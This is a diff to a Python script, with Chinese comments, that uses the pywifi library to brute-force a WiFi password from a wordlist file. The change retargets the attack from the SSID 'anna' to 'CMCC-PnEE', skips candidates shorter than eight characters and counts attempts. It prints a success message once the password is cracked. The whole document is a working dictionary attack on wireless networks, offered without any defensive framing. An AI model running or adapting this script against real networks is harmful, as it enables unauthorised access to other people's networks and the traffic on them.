@@ -21,11 +21,7 @@ from pywifi import const
 import time
 
 #测试连接，返回链接结果
-def wifiConnect(pwd):
-    #抓取网卡接口
-    wifi=pywifi.PyWiFi()
-    #获取第一个无线网卡
-    ifaces=wifi.interfaces()[0]
+def wifiConnect(pwd, wifi_name, ifaces):
     #断开所有连接
     ifaces.disconnect()
     # time.sleep(1)
@@ -34,7 +30,7 @@ def wifiConnect(pwd):
         #创建WiFi连接文件
         profile=pywifi.Profile()
         #要连接WiFi的名称
-        profile.ssid="anna"
+        profile.ssid=wifi_name    
         #网卡的开放状态
         profile.auth=const.AUTH_ALG_OPEN
         #wifi加密算法,一般wifi加密算法为wps
@@ -49,7 +45,7 @@ def wifiConnect(pwd):
         tep_profile=ifaces.add_network_profile(profile)
         ifaces.connect(tep_profile)
         #wifi连接时间
-        time.sleep(1)
+        time.sleep(2)
         if ifaces.status()==const.IFACE_CONNECTED:
             return True
         else:
@@ -59,28 +55,24 @@ def wifiConnect(pwd):
 
 #读取密码本
 def readPassword():
+    #抓取网卡接口
+    wifi=pywifi.PyWiFi()
+    #获取第一个无线网卡
+    ifaces=wifi.interfaces()[0]
+
     print("开始破解:")
     #密码本路径
     path="./password.txt"
-    #打开文件
-    # with open(path, "r") as fr:
-    #     lines = fr.readlines()
-    # for line in tqdm(lines):
-    #     line = line.strip('\n')
-    #     bool=wifiConnect(line)
-    #     if bool:
-    #         print("密码已破解： ", line)
-    #         print("WiFi已自动连接!!!")
-    #         break
-    #     else:
-    #         #跳出当前循环，进行下一次循环
-    #         print("密码破解中....密码校对: ", line)
     file=open(path,"r")
+    c = 0
     while True:
         try:
             #一行一行读取
             pad=file.readline()
-            bool=wifiConnect(pad)
+            if len(pad) < 8:
+                continue
+            bool=wifiConnect(pad, 'CMCC-PnEE', ifaces)
+            c += 1
             
             if bool:
                 print("密码已破解： ",pad)
@@ -88,7 +80,7 @@ def readPassword():
                 break
             else:
                 #跳出当前循环，进行下一次循环
-                print("密码破解中....密码校对: ",pad)
+                print(c, "密码破解中....密码校对: ",pad)
         except:
             continue
 
